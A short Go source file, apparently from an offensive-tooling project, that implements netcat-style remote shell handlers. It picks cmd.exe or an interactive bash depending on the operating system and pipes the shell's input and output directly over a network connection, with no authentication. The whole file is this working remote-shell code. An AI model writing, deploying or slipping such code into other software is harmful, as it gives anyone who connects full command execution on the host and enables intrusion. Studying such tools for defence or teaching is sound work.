package tcp

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
)

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

func (f *Flusher) Write(b []byte) (int, error) {
	size, err := f.w.Write(b)

	if err != nil {
		log.Printf("[!] Error while writing data: %s\n", err)
		return -1, nil
	}

	if err := f.w.Flush(); err != nil {
		log.Printf("[!] Error while flushing data: %s\n", err)
		return -1, nil
	}

	return size, err
}

/*
Returns interpreter as string based on OS
*/
func GetInterpreterCommand() *exec.Cmd {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe")
	default:
		cmd = exec.Command("/bin/bash", "-i")
	}
	return cmd
}

func HandleNcConn(conn net.Conn) {
	defer conn.Close()

	command := GetInterpreterCommand()

	// set std in/out/err to conn
	command.Stdin = conn
	command.Stdout = NewFlusher(conn)
	command.Stderr = conn

	// run command
	if err := command.Run(); err != nil {
		log.Printf("[!] Error while running command: %s\n", err)
	}
}

func HandleNcConnPipe(conn net.Conn) {
	defer conn.Close()

	command := GetInterpreterCommand()

	// get read and write Pipe ptrs
	rp, wp := io.Pipe()  // writer will write and reader will read synchornously; hence, used to connect writer to reader
	command.Stdin = conn // command will be recvd from connection
	command.Stdout = wp  // command response needs to be displayed in output
	go io.Copy(conn, rp) // copy reader data to connection
	// run command
	if err := command.Run(); err != nil {
		log.Printf("[!] Error while running command: %s\n", err)
	}
}
